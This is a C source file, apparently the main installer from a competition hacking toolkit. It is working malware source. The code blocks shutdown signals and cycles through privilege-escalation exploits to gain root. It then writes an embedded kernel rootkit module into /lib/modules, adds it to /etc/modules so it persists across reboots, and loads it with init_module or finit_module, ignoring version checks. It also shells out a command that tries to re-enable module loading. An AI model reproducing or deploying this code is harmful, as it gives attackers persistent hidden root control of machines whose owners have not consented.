/*
 * This is THE executable payload to be run be when first gaining access to 
 * a target machine. It will perform local privilege escalation as necessary 
 * to gain root privileges, afterwhich it will install persistance payloads
 * (namely both kernel level and user level rootkits) to prevent detection 
 * and removal.
 * 
 * The persistance payloads also contain mission specific code, like claiming a 
 * box for a king of the hill (koth) competition, which they will run appropriately
 * once installed.
 * 
 * Further, all the persistance payloads as well as other payloads for further 
 * attacks are self contained and packed inside this one installer file.
 * 
 * This installer file is meant to be almost entirely standalone, avoiding relying 
 * on any outside librabries, including libc, when possible and not overly
 * inconvient.
 * 
 * Author: Daniel Liscinsky
 */


#include "libc_impl.h"
#include "linux_lpe_exploits.h"
#include "payloads/payloads.h"
#include "exploit.h"
#include "magic.h"
#include "debug_u.h"

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <sys/utsname.h>
#include <limits.h>
#include <signal.h>
//#include <linux/module.h>



typedef unsigned int kernel_ver_t;

#define KERNEL_VERSION_UNKNOWN 0xFFFFFFFF

#define MODULE_INIT_IGNORE_MODVERSIONS	(1 << 0)
#define MODULE_INIT_IGNORE_VERMAGIC		(1 << 1)


#define DEFAULT_WRITE_RETRY_COUNT 20 // The nubmer of times to retry the write when write() returns 0



/**
 * 
 * @return The kernel version for the given kernel release, encoded as 
 * an unsigned integer.
 * 
 * The kernel version is stored in an unsigned integer as follows:
 *	.
 */
kernel_ver_t kernel_ver_strtoui(const char *_ver_str) {
	kernel_ver_t version = 0;
	int bit_offset = sizeof(int) * CHAR_BIT;
	
	// Create a copy of the string
	char *ver_str = malloc(strlen(_ver_str));
	if (!ver_str) {
		return KERNEL_VERSION_UNKNOWN;
	}

	strcpy(ver_str, _ver_str);

	// Process the string
	bit_offset -= 3;
	version |= (ver_str[0] - '0') << bit_offset;

	char *curr = ver_str + 2;
	char *next = curr;
	while (*next != '.') {
		next++;
	}

	next++; // Save start of remainder of string
	next[-1] = '\0'; // Null terminate the preceeding section

	bit_offset -= 5;
	version |= atoi(curr) << bit_offset;// 5 bits for minor version
	
	curr = next;
	while (*next != '.' && *next) {
		next++;
	}

	// If found another '.'
	if (*next) {
		next++; // Save start of remainder of string
		next[-1] = '\0'; // Null terminate the preceeding section

		bit_offset -= 7;
		version |= atoi(curr) << bit_offset;// 7 bits

		curr = next;
	}

	next = curr; // Reset next


				 // 
	while (*next != '-' && *next) {
		next++;
	}

	// If found a '-'
	if (*next) {
		next++; // Save start of remainder of string
		next[-1] = '\0'; // Null terminate the preceeding section

		unsigned int num = strtoul(curr, NULL, 10);//TODO use endptr..........

												   // Check if item is actually a number
		if (num) {//TODO check endptr != curr

			bit_offset -= 8;
			version |= num << bit_offset;// 8 bits
		}
		// TODO
		else {


		}

		curr = next;
	}




	/*
	printf("buf.release=%s\n", buf.release);

	char *num_part = strtok(buf.release, '.');
	bit_offset -= 3;
	version |= atoi(num_part) << bit_offset;// 3 bits for major version
	printf("1.=%s\n", num_part);

	num_part = strtok(NULL, '.');
	bit_offset -= 5;
	version |= atoi(num_part) << bit_offset;// 5 bits for minor version
	printf("2.=%s\n", num_part);
	char *num_part2;
	while (num_part2 = strtok(NULL, '.')) {
	printf(".part=%s\n", num_part2);
	bit_offset -= 8;
	version |= atoi(num_part2) << bit_offset;
	}


	while (num_part2 = strtok(NULL, '-')) {

	printf("-part=%s\n", num_part2);
	}
	*/
	DEBUG_printf2("version = %x\n", version);
	return version;
}
 
/**
 * @deprecated
 * 
 * @return The kernel version of the current host we are running on, 
 * encoded as an unsigned integer.
 */
/*
kernel_ver_t get_kernel_ver() {
	struct utsname uname_info;

	// Get system info
	if (uname(&uname_info) < 0) {
		//TODO well, this is bad..........
		return 0;
	}

	return kernel_ver_strtoui(uname_info.release);
}
*/

/**
 * Writes a string of bytes to the given fd.
 * 
 * @return 0 if the entire buffer was successfully written. Otherwise, returns the 
 * number of bytes at the end of the buffer that failed to be written.
 */
size_t write_all(int fd, const void *buf, size_t len) {

	ssize_t offset = 0;
	ssize_t written;
	unsigned int wr_retry_count = DEFAULT_WRITE_RETRY_COUNT;

	do {
		written = write(fd, (char *)buf + offset, len);

		// If write failed
		if (written < 0) {
			wr_retry_count--;
		}
		else {			
			offset += written;
			len -= written;

			// Reset retry count
			wr_retry_count = DEFAULT_WRITE_RETRY_COUNT;
		}

		// Continue writing until the entire buffer is written or too many failed writes occur
	} while (len > 0 && wr_retry_count > 0);
	
	return len;
}

/**
 *
 */
int get_root() {

	int curr_lpe_idx = 0;

	// While not root
	while (geteuid()) {
			
		// If out of exploits to try, return failure
		if (curr_lpe_idx >= lpe_exploits_list_len) {
			return 0;
		}

		// Perform the LPE exploit
		(lpe_exploits_list[curr_lpe_idx])();

		curr_lpe_idx++;
	}

	//fprintf(stderr, "I am (g)root\n");
	// Success
	return 1;
}



int main(void) {

	// Disable signals
	signal(SIGHUP, SIG_IGN);
	//signal(SIGKILL, SIG_IGN);
	signal(SIGINT, SIG_IGN);
	signal(SIGTSTP, SIG_IGN);
	signal(SIGQUIT, SIG_IGN);
	//signal(SIGSTOP, SIG_IGN);
	signal(SIGTERM, SIG_IGN);
	signal(SIGPIPE, SIG_IGN);

	//TODO
	//signal(SIGSEGV, SIG_IGN); //TODO handle this somehow.....


	// Perform local privilege escalation if necessary
	if (!get_root()) {
		fprintf(stderr, "Please run as root\n");

		//this is bad....
		//but continue anyway and do what I can in userland...

		//note: probably drop a lesser payload specifically for this case and delete this one to prevent someone from getting their hands on the gold prize
	}


	// Unpack the kernel module






	// Get kernel version of host
	struct utsname uname_info;

	if (uname(&uname_info) < 0) {
		//TODO well, this is bad..........
		return 0;
	}
	


	const kernel_ver_t kv3_13_0_24_generic = kernel_ver_strtoui("3.13.0-24-generic");
	const kernel_ver_t kv4_4_0_119_generic = kernel_ver_strtoui("4.4.0-119-generic");
	const kernel_ver_t kv4_4_0_122_generic = kernel_ver_strtoui("4.4.0-122-generic");
	kernel_ver_t kv_curr_host = kernel_ver_strtoui(uname_info.release);
	
	int result = -1;
	unsigned char *ko_obj = NULL;
	unsigned int ko_obj_len = 0;

	// Select the kernel module specific to the current host kernel version
	if (kv_curr_host == kv3_13_0_24_generic) {
		DEBUG_printf1("init_mod for 3.13.0-24-generic ...\n");
		ko_obj = kernel_3_13_0_24_generic_ko;
		ko_obj_len = kernel_3_13_0_24_generic_ko_len;
	}
	else if (kv_curr_host == kv4_4_0_119_generic) {
		DEBUG_printf1("init_mod for 4.4.0-119-generic ...\n");
		//ko_obj = kernel_4_4_0_119_generic_ko;
		//ko_obj_len = kernel_4_4_0_119_generic_ko_len;
	}
	else if (kv_curr_host == kv4_4_0_122_generic) {
		DEBUG_printf1("init_mod for 4.4.0-122-generic ...\n");
		ko_obj = kernel_4_4_0_122_generic_ko;
		ko_obj_len = kernel_4_4_0_122_generic_ko_len;
	}
	else {
		//ko_obj = kernel_3_13_0_24_generic_ko;
		//ko_obj_len = kernel_3_13_0_24_generic_ko_len;

		ko_obj = kernel_4_4_0_122_generic_ko;
		ko_obj_len = kernel_4_4_0_122_generic_ko_len;
	}

	
	// Construct the kernel version dependent .ko file path
	char filepath[128] = "/lib/modules/";
	strcat(filepath, uname_info.release);
	strcat(filepath, "/kernel/drivers/net/");
	strcat(filepath, KO_MODULE_NAME);
	strcat(filepath, ".ko");

	// Save kernel module to disk
	int ko_fd = open(filepath, O_CREAT | O_TRUNC | O_WRONLY, S_IRUSR | S_IRGRP | S_IROTH);
	if (ko_fd < 0) {
		// TODO this is BAD BAD BAD...
		goto insmod;
	}

	result = write_all(ko_fd, ko_obj, ko_obj_len);
	
	// If failed to write the entire kernel object file
	if (result > 0) {
		// TODO this is BAD BAD BAD...
		DEBUG_printf1("failed to write entire ko");
	}
	
	// Run depmod actaully install the module
	result = system("depmod");
	//TODO ^^^^^^^^^ more error checking for depmod invocation... 

	DEBUG_printf2("depmod result = %d\n", result);

	// Add to /etc/modules to make the module persistant on reboot
	int etc_modules_fd = open("/etc/modules", O_APPEND | O_WRONLY);
	if (etc_modules_fd < 0) {
		// TODO this is BAD BAD BAD...
	}

	result = write_all(etc_modules_fd, KO_MODULE_NAME "\n", strlen(KO_MODULE_NAME "\n"));
	// If failed to write the entire kernel object file
	if (result > 0) {
		// TODO this is BAD BAD BAD...
		DEBUG_printf1("failed to write /etc/modules\n");
	}
	close(etc_modules_fd);


insmod:
	// Install the kernel module
	result = init_module(ko_obj, ko_obj_len, "");

	DEBUG_printf2("result = %d\n", result);

	// If failed
	if (result < 0) {
		//TODO check errno?

		result = system("echo 0 > /proc/sys/kernel/modules_disabled");
		//TODO    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ actually programmatically do this by opening the file...
		//TODO     or at least check for error in result

		result = init_module(ko_obj, ko_obj_len, "");
		
		DEBUG_printf2("result = %d\n", result);

		
		// Try with finit_module
		if (result < 0) {
			

			// Try again ignoring potential kernel incompatibilities (if the kernel allows it)
			result = finit_module(ko_fd, "", MODULE_INIT_IGNORE_MODVERSIONS | MODULE_INIT_IGNORE_VERMAGIC);

			DEBUG_printf2("result = %d\n", result);

			// If it still fails
			if (result < 0) {

				//TODO ????


				return -1;
			}
			
		}
	}




//other:
	//TODO other things


	//TODO cleanup... / remove traces

	
	// Cleanup
	close(ko_fd);

	return 0;
}

